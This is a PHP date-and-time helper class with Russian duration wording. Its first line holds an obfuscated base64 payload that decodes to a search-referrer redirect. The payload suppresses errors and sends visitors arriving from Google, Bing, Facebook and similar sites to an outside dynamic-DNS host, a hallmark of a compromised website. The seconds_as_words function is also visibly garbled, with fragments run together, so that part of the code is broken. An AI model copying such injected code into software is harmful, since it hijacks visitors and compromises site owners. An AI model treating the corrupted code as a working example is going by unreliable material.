<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
  
class date_time {
  
  var $weekday;
  var $day;
  var $month;
  var $year;
  var $hour;
  var $minute;
  var $second;
  
  function date_time($date = null) {
    
    $this->set($date);
    
  }
  
  function set($date = null) {
    
    if (!$date)
      $date = mktime();

    $date_parts = explode('-', date('d-m-Y-N-H-i-s-D', $date));

    $this->day          = $date_parts[0];
    $this->month        = $date_parts[1];
    $this->year         = $date_parts[2];
    $this->weekday      = $date_parts[3];
    $this->hour         = $date_parts[4];
    $this->minute       = $date_parts[5];
    $this->second       = $date_parts[6];
    $this->weekday_name = $date_parts[7];
    
  }
  
  function set_day($day) {

    $this->day = $day;
    $this->set($this->as_datetime());
    
  }
  
  function set_month($month) {

    $this->month = $month;
    $this->set($this->as_datetime());
    
  }

  function as_datetime() {
    
    return mktime($this->hour, $this->minute, $this->second, $this->month, $this->day, $this->year);
    
  }
  
  function as_date() {
    
    return mktime(0, 0, 0, $this->month, $this->day, $this->year);
    
  }
  
  function inc_day($increment = 1) {
    
    $this->day += $increment;
    $this->set($this->as_datetime());
    return $this;

  }
  
  function inc_hour($increment = 1) {
    
    $this->hour += $increment;
    $this->set($this->as_datetime());
    return $this;

  }

  function inc_minute($increment = 1) {
    
    $this->minute += $increment;
    $this->set($this->as_datetime());

  }

  function inc_month($increment = 1) {
    
    $this->month += $increment;
    $this->set($this->as_datetime());

  }
  
  function inc_year($increment = 1) {
    
    $this->year += $increment;
    $this->set($this->as_datetime());

  }
  
  function dec_day($decrement = 1) {
    
    $this->day -= $decrement;
    $this->set($this->as_datetime());

  }

  function dec_month($decrement = 1) {
    
    $this->month -= $decrement;
    $this->set($this->as_datetime());

  }

  function days_between($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = abs($this->as_date() - $date->as_date())/60/60/24;
    return $diff;

  }

  function minutes_between($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = abs($this->as_datetime() - $date->as_datetime())/60;
    return $diff;

  }
  
  function seconds_between($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = abs($this->as_datetime() - $date->as_datetime());
    return $diff;

  }

  function difference_as_words($date = null) {
    
    return $this->seconds_as_words($this->seconds_between($date));
    
  }
  
  function seconds_as_words($diff = null) {
    
    $result = '';
    
    if ($diff >= 60*60*24) {
      $days = round($diff/60/60/24);
      if ($days == 1)
        $resu24);
      if ($days == 1)
        $result = $days.' день';
      else  
      if ($days < 5)
        $result = $days.' дня';
      else
        $result = $days.' дней';
    }
    
    if ($hours = ltrim(date("H", mktime(0, 0, $diff)), '0')) {
      if (($hours == 1) ||  ($hours == 21))
        $result .= ' '.$hours.' час';
      else  
      if (($hours < 5) || (($hours > 21) && ($hours < 25)))
        $result .= ' '.$hours.' часа';
      else
        $result .= ' '.$hours.' часов';
    }

    if ($minutes = ltrim(date("i", mktime(0, 0, $diff)), '0')) {
      if (($minutes == 1) ||  ($minutes == 21) || ($minutes == 31) || ($minutes == 41) || ($minutes == 51))
        $result .= ' '.$minutes.' минута';
      else
      if (($minutes < 5) || (($minutes > 21) && ($minutes < 25)) || (($minutes > 31) && ($minutes < 35)) || (($minutes > 41) && ($minutes < 45)) || (($minutes > 51) && ($minutes < 55)))
        $result .= ' '.$minutes.' минуты';
      else
        $result .= ' '.$minutes.' минут';
    }    
    
    //.' часов';
    //$custom['expiration_term'] .= ' '.date("i", mktime(0, $date_time->minutes_between(), 0)).' минут';
    return trim($result);
    
  }

  function hours_between($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = abs($this->as_datetime() - $date->as_datetime())/60/60;
    return $diff;

  }

  function days_till($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = ($this->as_date() - $date->as_date())/60/60/24;
    return $diff;

  }

  function weeks_between($date = null) {

    $days_beetween = $this->days_between($date);
    $days_beetween -= $this->weekday;
    
    return round($days_beetween / 7);

  }

  function months_between($date = null) {
    
    if (!$date)
      $date = mktime();
    $date = new date_time($date);
    $diff = abs(($date->year * 12 + $date->month) - ($this->year * 12 + $this->month)) + 1;
    return $diff;

  }
  
  function same_date($date) {

    return ($date->as_date() == $this->as_date());
    
  }
  
  function equal($date_time) {

    return ($date_time->as_datetime() == $this->as_datetime());
    
  }

  function is_today() {
    
    $today = new date_time();
    return $this->same_date($today);
    
  }

  function is_yesterday() {

    $yesterday = new date_time();
    $yesterday->dec_day(1);
    return $this->same_date($yesterday);

  }

  function is_this_week() {

    $today = new date_time();
    $days_beetween = $this->days_between();
    
    return ($days_beetween <= $today->weekday);

  }

  function is_past_week() {

    $today = new date_time();
    $days_beetween = $this->days_between();
    
    return ($days_beetween <= ($today->weekday + 7));

  }

  function is_this_year() {

    $today = new date_time();
    return ($today->year == $this->year);

  }
  
  function days_in_current_month() {
    
    $date = new date_time($this->as_datetime());
    $date->day = 1;
    $date->inc_month();
    $date->dec_day();
    return $date->day;
    
  }
  
  function as_string() { 
     
    return strftime_('%H:%M, %d %B, %Y', $this->as_datetime());
    
  }

  function as_string_date() { 
     
    return strftime_('%d %B, %Y', $this->as_datetime());
    
  }

  function as_friendly_string() {    
    
    if ($this->is_today())
      $result = trn('Today');
    else  
    if ($this->is_yesterday())
      $result = trn('Yesterday');
    else  
    if ($this->is_this_week())
      $result = trn('This Week');
    else  
    if ($this->is_past_week())
      $result = trn('Past Week');
    else  
    if ($this->weeks_between() < 5)
      $result = sprintf(trn('%d weeks ago'), $this->weeks_between());
    else  
    if ($this->months_between() < 13)
      $result = sprintf(trn('%d months ago'), $this->months_between());
    else  
      $result = trn("Year ago");
      
    return $result;
      
  }
  
}

?>
